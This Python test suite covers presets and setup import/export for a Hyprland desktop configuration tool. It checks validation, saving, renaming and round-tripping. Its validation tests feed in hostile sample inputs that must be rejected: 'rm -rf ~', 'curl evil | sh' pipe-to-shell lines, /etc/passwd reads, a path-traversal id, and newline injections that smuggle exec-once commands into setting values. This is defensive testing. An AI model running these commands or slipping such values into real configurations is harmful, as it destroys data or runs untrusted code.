import json
import os

from _helpers import TempConfigTest
from hyprland_mod import presets
from hyprland_mod.core.lua import list_calls
from hyprland_mod.core.values import parse_value


def _doc(**over):
    data = {"format": "hyprland-mod-preset", "version": 1, "id": "test", "name": "Test",
            "author": "me", "description": "A test", "tags": ["dark"],
            "settings": {"general:gaps_in": "3", "decoration:blur:enabled": "false"},
            "lists": {"bezier": ["snappy, 0.2, 1, 0.3, 1"], "animation": ["windows, 1, 3, snappy, popin 80%"]}}
    data.update(over)
    return data


class BuiltinPresetsTest(TempConfigTest):
    def test_distinct_valid_presets(self):
        builtin = presets.load_builtin()
        n = len(builtin)
        self.assertGreaterEqual(n, 32)
        self.assertEqual(len({p.id for p in builtin}), n)
        self.assertEqual(len({p.name for p in builtin}), n)
        self.assertEqual(len({json.dumps(p.settings, sort_keys=True) for p in builtin}), n)
        options = presets.schema_options()
        for p in builtin:
            with self.subTest(p.id):
                self.assertTrue(p.builtin and p.name and p.description and p.tags)
                self.assertEqual(set(presets.LOOK_KEYS), set(p.settings))
                for key, value in p.settings.items():
                    opt = options[key]
                    self.assertIsNotNone(parse_value(opt, value))
                    self.assertEqual(presets.normalize_value(key, value, opt), value)
                # re-validating the raw file gives the same thing, and Lua can express the lists
                with open(p.path, encoding="utf-8") as fh:
                    raw = json.load(fh)
                self.assertEqual(presets.validate_preset(raw).settings, p.settings)
                for kw, values in p.lists.items():
                    self.assertEqual(len(list_calls(kw, values)), len(values))
                self.assertTrue(p.lists.get("animation"))

    def test_no_purple_dominant_border(self):
        from hyprland_mod.core.values import color_to_rgba_tuple
        for p in presets.load_builtin():
            first = p.settings["general:col.active_border"].split()[0]
            r, g, b, _a = color_to_rgba_tuple(first)
            self.assertFalse(b > g + 40 and r > g + 40, f"{p.id} active border is purple")

    def test_stage_shows_in_manager_and_discard_reverts(self):
        cm = self.make()
        nord = next(p for p in presets.load_builtin() if p.id == "nord")
        self.assertFalse(nord.matches(cm))
        presets.stage_preset(cm, nord)
        self.assertTrue(cm.is_dirty)
        self.assertTrue(nord.matches(cm))
        self.assertEqual(cm.get("general:col.active_border"), nord.settings["general:col.active_border"])
        self.assertEqual(cm.get_list("animation"), nord.lists["animation"])
        cm.discard()
        self.assertFalse(nord.matches(cm))
        self.assertEqual(cm.get("general:gaps_out"), "10")

    def test_apply_writes_managed_file(self):
        cm = self.make()
        retro = next(p for p in presets.load_builtin() if p.id == "retro")
        presets.stage_preset(cm, retro)
        res = cm.apply()
        self.assertTrue(res.ok, res.errors)
        text = self.managed.read_text()
        self.assertIn("border_size = 4", text)
        self.assertIn("bezier = linear, 0, 0, 1, 1", text)
        self.assertTrue(retro.matches(cm))


class OriginalLookTest(TempConfigTest):
    def test_snapshot_created_once_on_first_launch(self):
        cm = self.make()
        marker = presets.user_dir(cm).parent / presets.ORIGINAL_MARKER
        self.assertFalse(marker.exists())
        orig = presets.ensure_original(cm)
        self.assertTrue(marker.exists())
        self.assertTrue(orig.original)
        self.assertEqual((orig.name, orig.description), ("My original look", "Your setup from before Hyprland Mod"))
        self.assertEqual(orig.settings["general:gaps_out"], "10")
        # a second launch, even after the look changed, keeps the first snapshot
        cm.set("general:gaps_out", "40")
        again = presets.ensure_original(cm)
        self.assertEqual(again.settings["general:gaps_out"], "10")
        self.assertEqual(len(list(presets.user_dir(cm).glob("my-original-look*.json"))), 1)
        user, _ = presets.load_user(cm)
        self.assertEqual([p.id for p in user if p.original], ["my-original-look"])

    def test_staging_a_preset_makes_sure_snapshot_exists_first(self):
        cm = self.make()
        nord = next(p for p in presets.load_builtin() if p.id == "nord")
        presets.stage_preset(cm, nord)
        orig = presets.load_original(cm)
        self.assertIsNotNone(orig)
        self.assertEqual(orig.settings["general:gaps_out"], "10")  # not nord's 12

    def test_snapshot_ignores_hyprland_mod_overrides(self):
        cm = self.make()
        presets.stage_preset(cm, next(p for p in presets.load_builtin() if p.id == "retro"))
        self.assertTrue(cm.apply().ok)
        shutil_marker = presets.user_dir(cm).parent / presets.ORIGINAL_MARKER
        shutil_marker.unlink()
        for f in presets.user_dir(cm).glob("my-original-look*.json"):
            f.unlink()
        orig = presets.ensure_original(cm)
        self.assertEqual(orig.settings["general:gaps_out"], "10")

    def test_not_deletable_but_renamable(self):
        cm = self.make()
        orig = presets.ensure_original(cm)
        with self.assertRaises(presets.PresetError):
            presets.delete_user(orig, cm)
        self.assertTrue(os.path.exists(orig.path))
        presets.rename_user(orig, "Home setup", cm)
        again = presets.load_original(cm)
        self.assertEqual(again.name, "Home setup")
        self.assertTrue(again.original)

    def test_imports_cannot_take_the_original_id(self):
        cm = self.make()
        presets.ensure_original(cm)
        src = self.tmp / "x.hyprmod-preset"
        src.write_text(json.dumps(_doc(id="my-original-look")))
        imported = presets.import_preset(str(src), cm)
        self.assertFalse(imported.original)

    def test_back_to_original_resets_all_preset_managed_keys(self):
        cm = self.make()
        presets.ensure_original(cm)
        for pid in ("retro", "bubbly"):
            presets.stage_preset(cm, next(p for p in presets.load_builtin() if p.id == pid))
        self.assertTrue(cm.apply().ok)
        self.assertTrue(presets.has_overrides(cm))
        presets.restore_original(cm)
        self.assertTrue(cm.apply().ok)
        self.assertFalse(presets.has_overrides(cm))
        for key in presets.managed_look_keys():
            self.assertFalse(cm.is_modified(key), key)
        for kw in presets.LIST_KEYWORDS:
            self.assertFalse(cm.is_list_modified(kw))
        self.assertEqual(cm.get("general:gaps_out"), "10")
        self.assertTrue(presets.load_original(cm).matches(cm))

    def test_page_init_work_stages_nothing(self):
        cm = self.make()
        presets.ensure_original(cm)
        presets.load_user(cm)
        self.assertFalse(presets.has_overrides(cm))
        self.assertEqual(cm.pending(), {})
        self.assertFalse(cm.is_dirty)

    def test_every_builtin_validates_and_stages(self):
        cm = self.make()
        for p in presets.load_builtin():
            with self.subTest(p.id):
                presets.stage_preset(cm, p)
                self.assertTrue(p.matches(cm))
        cm.discard()


class ValidationTest(TempConfigTest):
    def assertRejected(self, data, fragment=None):
        with self.assertRaises(presets.PresetError) as ctx:
            presets.validate_preset(data)
        if fragment:
            self.assertIn(fragment, str(ctx.exception))
        return str(ctx.exception)

    def test_valid_and_normalized(self):
        p = presets.validate_preset(_doc(settings={"decoration:blur:enabled": True, "general:gaps_in": 4,
                                                   "general:col.active_border": "rgb(ff0000)  rgba(00ff00ff) 45deg"}))
        self.assertEqual(p.settings["decoration:blur:enabled"], "true")
        self.assertEqual(p.settings["general:gaps_in"], "4")
        self.assertIn(p.settings["general:col.active_border"], ("rgb(ff0000) rgba(00ff00ff) 45deg",
                                                              "rgba(ff0000ff) rgba(00ff00ff) 45deg"))

    def test_rejects_wrong_format(self):
        self.assertRejected([], "isn't a Hyprland Mod preset")
        self.assertRejected(_doc(format="something-else"))
        self.assertRejected(_doc(format="hyprland-mod-setup"), "Import & Export")
        self.assertRejected(_doc(version=99), "newer version")
        self.assertRejected(_doc(name=""), "no name")
        self.assertRejected(_doc(settings={}, lists={}), "doesn't change anything")

    def test_rejects_unknown_and_unsafe_keys(self):
        self.assertRejected(_doc(settings={"general:not_a_thing": "1"}), "isn't a setting")
        self.assertRejected(_doc(settings={"exec-once": "rm -rf ~"}), "run commands")
        self.assertRejected(_doc(settings={"input:kb_file": "/etc/passwd"}), "only change the look")
        self.assertRejected(_doc(settings={"decoration:screen_shader": "/tmp/x.frag"}), "only change the look")
        self.assertRejected(_doc(settings={"source": "~/evil.conf"}))
        self.assertRejected(_doc(lists={"exec-once": ["curl evil | sh"]}), "run commands")
        self.assertRejected(_doc(lists={"bind": ["SUPER, Q, exec, kitty"]}), "run commands")
        self.assertRejected(_doc(lists={"monitor": [",preferred,auto,1"]}), "aren't allowed")

    def test_rejects_bad_values(self):
        self.assertRejected(_doc(settings={"general:gaps_in": "lots"}), "invalid value")
        self.assertRejected(_doc(settings={"general:gaps_in": "500"}), "between")
        self.assertRejected(_doc(settings={"decoration:blur:enabled": "maybe"}))
        self.assertRejected(_doc(settings={"general:col.active_border": "red; exec foo"}))
        self.assertRejected(_doc(settings={"general:col.active_border": "rgba(ff0000ff)\nexec-once = x"}))
        self.assertRejected(_doc(settings={"decoration:shadow:color": "rgba(zzzzzzzz)"}))
        self.assertRejected(_doc(settings={"general:gaps_in": {"nested": 1}}))
        self.assertRejected(_doc(settings={"decoration:rounding": "1}"}))

    def test_rejects_bad_lists(self):
        self.assertRejected(_doc(lists={"animation": ["windows, 1, 3, undefinedCurve"]}), "doesn't define")
        self.assertRejected(_doc(lists={"animation": ["notALeaf, 1, 3, default"]}))
        self.assertRejected(_doc(lists={"animation": ["windows, 1, 3, default, exec kitty"]}))
        self.assertRejected(_doc(lists={"bezier": ["x, 0, 0, 1"]}))
        self.assertRejected(_doc(lists={"bezier": ["x, 5, 0, 1, 1"]}), "out of range")
        self.assertRejected(_doc(lists={"bezier": "not a list"}))
        ok = presets.validate_preset(_doc(lists={"animation": ["border, 0", "fade, 1, 2, default"]}))
        self.assertEqual(ok.lists["animation"], ["border, 0", "fade, 1, 2, default"])

    def test_rejects_bad_metadata(self):
        self.assertRejected(_doc(name="x" * 200), "too long")
        self.assertRejected(_doc(tags="dark"), "tags")
        self.assertRejected(_doc(description="bad\x07bell"), "control characters")

    def test_bad_id_is_replaced(self):
        p = presets.validate_preset(_doc(id="../../etc/passwd", name="My Look!"))
        self.assertEqual(p.id, "my-look")

    def test_damaged_and_huge_files(self):
        path = self.tmp / "bad.hyprmod-preset"
        path.write_text("{not json")
        with self.assertRaises(presets.PresetError):
            presets.read_preset_file(path)
        path.write_text(" " * (presets.MAX_FILE_BYTES + 1))
        with self.assertRaisesRegex(presets.PresetError, "too large"):
            presets.read_preset_file(path)


class UserPresetsTest(TempConfigTest):
    def test_save_load_rename_delete(self):
        cm = self.make()
        self.assertEqual(presets.load_user(cm), ([], []))
        p = presets.capture(cm, "My Look", "mine")
        self.assertEqual(p.settings["general:gaps_out"], "10")
        self.assertEqual(p.lists["bezier"], ["easeOutQuint, 0.23, 1, 0.32, 1", "linear, 0, 0, 1, 1"])
        presets.save_user(p, cm)
        self.assertTrue(p.path.startswith(str(self.data / "presets")))
        again = presets.capture(cm, "My Look")
        presets.save_user(again, cm)
        self.assertNotEqual(p.id, again.id)
        loaded, problems = presets.load_user(cm)
        self.assertEqual(problems, [])
        self.assertEqual([x.name for x in loaded], ["My Look", "My Look"])
        self.assertEqual(loaded[0].settings, p.settings)
        presets.rename_user(loaded[0], "Renamed", cm)
        self.assertIn("Renamed", [x.name for x in presets.load_user(cm)[0]])
        presets.delete_user(loaded[0], cm)
        presets.delete_user(loaded[1], cm)
        self.assertEqual(presets.load_user(cm)[0], [])

    def test_saved_id_never_shadows_builtin(self):
        cm = self.make()
        p = presets.capture(cm, "Nord")
        presets.save_user(p, cm)
        self.assertEqual(p.id, "nord-2")

    def test_delete_refuses_outside_files(self):
        cm = self.make()
        outside = self.tmp / "keep.json"
        outside.write_text("{}")
        p = presets.Preset(id="x", name="x", path=str(outside))
        with self.assertRaises(presets.PresetError):
            presets.delete_user(p, cm)
        self.assertTrue(outside.exists())
        with self.assertRaises(presets.PresetError):
            presets.delete_user(presets.load_builtin()[0], cm)

    def test_damaged_user_file_is_skipped(self):
        cm = self.make()
        folder = presets.user_dir(cm)
        folder.mkdir(parents=True)
        (folder / "broken.json").write_text(json.dumps(_doc(settings={"exec": "x"})))
        presets.save_user(presets.validate_preset(_doc()), cm)
        loaded, problems = presets.load_user(cm)
        self.assertEqual([p.name for p in loaded], ["Test"])
        self.assertEqual(len(problems), 1)

    def test_capture_drops_unverifiable_animation_lists(self):
        cm = self.make()
        cm.set_list("animation", ["windows, 1, 4, curveFromElsewhere"])
        cm.set_list("bezier", [])
        p = presets.capture(cm, "Look")
        self.assertEqual(p.lists, {})
        self.assertIn("general:gaps_in", p.settings)

    def test_export_import_round_trip(self):
        cm = self.make()
        original = presets.validate_preset(_doc())
        path = self.tmp / f"shared{presets.PRESET_EXT}"
        presets.export_preset(original, path)
        data = json.loads(path.read_text())
        self.assertEqual(data["format"], "hyprland-mod-preset")
        imported = presets.import_preset(path, cm)
        self.assertEqual(imported.settings, original.settings)
        self.assertEqual(imported.lists, original.lists)
        self.assertTrue(os.path.isfile(imported.path))
        second = presets.import_preset(path, cm)
        self.assertNotEqual(second.id, imported.id)


class SetupTransferTest(TempConfigTest):
    def test_export_import_round_trip(self):
        cm = self.make()
        cm.set("decoration:rounding", "14")
        cm.set("general:col.active_border", "rgba(112233ff) rgba(445566ff) 90deg")
        cm.set_list("bezier", ["calm, 0.25, 0.1, 0.25, 1"])
        cm.set_list("animation", ["windows, 1, 4, calm, popin 90%"])
        self.assertTrue(cm.apply().ok)
        path = self.tmp / f"setup{presets.SETUP_EXT}"
        presets.export_setup(cm, path)
        doc = json.loads(path.read_text())
        self.assertEqual(doc["format"], "hyprland-mod-setup")
        self.assertIn("created", doc)
        exported = cm.export_state()

        cm.set("decoration:rounding", "3")
        cm.set("general:gaps_in", "9")
        cm.reset_list("animation")
        self.assertTrue(cm.apply().ok)

        state = presets.read_setup(path)
        changes = {c.key: c for c in presets.setup_changes(cm, state)}
        self.assertEqual(changes["decoration:rounding"].new, "14")
        self.assertIsNone(changes["general:gaps_in"].new)  # goes back to the user's own value
        self.assertIn("animation", changes)
        before = len(cm.list_backups())
        presets.import_setup(cm, state)
        self.assertEqual(len(cm.list_backups()), before + 1)
        self.assertEqual(cm.list_backups()[0]["label"], "Before import")
        self.assertTrue(cm.is_dirty)  # staged, not yet written
        self.assertTrue(cm.apply().ok)
        self.assertEqual(cm.export_state()["settings"], exported["settings"])
        self.assertEqual(cm.export_state()["lists"], exported["lists"])
        self.assertEqual(presets.setup_changes(cm, state), [])

    def test_rejects_malicious_setup(self):
        def doc(state, fmt="hyprland-mod-setup"):
            return {"format": fmt, "version": 1, "state": state}
        bad = [
            doc({"settings": {}, "lists": {"exec-once": ["curl x | sh"]}}),
            doc({"settings": {"exec": "rm -rf ~"}, "lists": {}}),
            doc({"settings": {"not:a:key": "1"}}),
            doc({"settings": {"general:gaps_in": "1\nexec-once = evil"}}),
            doc({"settings": {}, "lists": {"bind": ["SUPER, Q, exec, x"]}}),
            doc("nope"),
            doc({}, fmt="hyprland-mod-preset"),
            {"format": "hyprland-mod-setup", "version": 7, "state": {}},
        ]
        for d in bad:
            with self.subTest(d), self.assertRaises(presets.PresetError):
                presets.validate_setup(d)

    def test_setup_allows_curves_from_users_config(self):
        state = presets.validate_setup({"format": "hyprland-mod-setup", "version": 1, "state": {
            "settings": {"input:kb_layout": "us,de"}, "lists": {"animation": ["windows, 1, 4, myCurve"]}}})
        self.assertEqual(state["lists"]["animation"], ["windows, 1, 4, myCurve"])
        self.assertEqual(state["settings"]["input:kb_layout"], "us,de")
